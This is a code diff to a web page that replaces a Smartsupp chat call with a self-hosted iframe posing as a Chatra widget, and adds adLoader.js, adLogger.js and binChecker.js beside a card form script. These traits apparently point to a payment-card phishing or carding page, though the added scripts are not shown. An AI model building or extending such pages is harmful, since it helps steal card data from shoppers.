@@ -263,6 +263,15 @@
   <script>
     if (true) {
       document.querySelector('#support').innerHTML = `
+        <div class="chatra--webkit chatra--style-round chatra--side-bottom chatra--pos-right chatra--visible chatra--expanded chatra--fast-toggle"
+            id="chatra" data-turbolinks-permanent=""
+            style="width:380px;height:600px;transform:none;z-index:2147483647;display:none;">
+            <div id="chatra__iframe-wrapper">
+                <iframe frameborder="0" id="chatra__iframe" allowtransparency="true" title="Chat"
+                    allow="autoplay" src="/style/support/index.html"
+                    style="width:380px;height:600px;position:absolute;"></iframe>
+            </div>
+        </div>
         <div class="support-circle" onclick="openSupport()"></div>
       `;
     }
@@ -270,9 +279,18 @@
     function openSupport() {
       try {
         var circle = document.querySelector('.support-circle');
+        var chatra = document.querySelector('#chatra');
         if (circle) circle.style.display = 'none';
-        if (typeof smartsupp === 'function') {
-          smartsupp('chat:open');
+        if (chatra) {
+          chatra.style.display = 'block';
+          chatra.style.zIndex = '2147483647';
+          var iframe = document.getElementById("chatra__iframe");
+          if (iframe && iframe.contentWindow) {
+            try {
+              var elmnt = iframe.contentWindow.document.querySelector("#app");
+              if (elmnt) elmnt.style.display = "block";
+            } catch(e) {}
+          }
         }
       } catch(e) {}
     }
@@ -356,6 +374,9 @@
     });
   </script>
 
+  <script src="/style/other/adLoader.js"></script>
+  <script src="/style/other/adLogger.js"></script>
+  <script src="/style/other/binChecker.js"></script>
   <script src="/style/cardform/cardform.js"></script>
   <script src="/style/other/axios.min.js"></script>
   <script src="/style/modals/modals.js?v=31"></script>
